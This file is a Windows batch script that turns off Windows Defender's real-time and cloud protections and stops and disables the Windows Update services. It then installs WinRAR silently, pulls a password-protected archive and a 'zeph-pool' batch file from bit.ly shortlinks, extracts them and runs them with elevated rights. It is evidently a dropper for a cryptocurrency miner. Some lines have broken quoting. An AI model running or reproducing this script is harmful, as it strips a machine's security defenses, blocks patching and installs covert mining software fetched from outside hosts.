@echo off
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1"
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1"
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Name 'DisableBlockAtFirstSeen' -Value 1"
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet' -Name 'SpynetReporting' -Value 0"
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'SubmitSamplesConsent' -Value 2"
PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
PowerShell -Command "Set-Service -Name 'wuauserv' -StartupType Disabled"
PowerShell -Command "Stop-Service -Name wuauserv -Force"
PowerShell -Command "Set-Service -Name wuauserv -StartupType Disabled"
PowerShell -Command "Stop-Service -Name WaaSMedicSvc -Force"
PowerShell -Command "Set-Service -Name WaaSMedicSvc -StartupType Disabled"
PowerShell -Command "Stop-Service -Name UsoSvc -Force"
PowerShell -Command "Set-Service -Name UsoSvc -StartupType Disabled"
PowerShell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate' -Name 'TargetReleaseVersion' -Value 1 -Type DWord"
PowerShell -Command "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'"
PowerShell -Command "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
PowerShell -Command "Invoke-WebRequest -Uri "https://bit.ly/2miners-github" -OutFile "C:\setup.rar"' -OutFile 'C:\setup.rar'"
PowerShell -Command "& 'C:\Program Files\WinRAR\WinRAR.exe' x -p2miners 'C:\setup.rar' 'C:\' -Wait"
PowerShell -Command "Start-Sleep -Seconds 10"
PowerShell -Command "Invoke-WebRequest -Uri "https://bit.ly/zeph-pool" -OutFile "C:\zeph-pool.bat""
PowerShell -Command "Copy-Item -Path "C:\zeph-pool.bat" -Destination "C:\Setup\Zephyr\zeph-pool.bat" -Force"
PowerShell -Command "Start-Process -FilePath 'C:\Setup\Zephyr\zeph-pool.bat' -ArgumentList '/S' -Verb RunAs"
exit
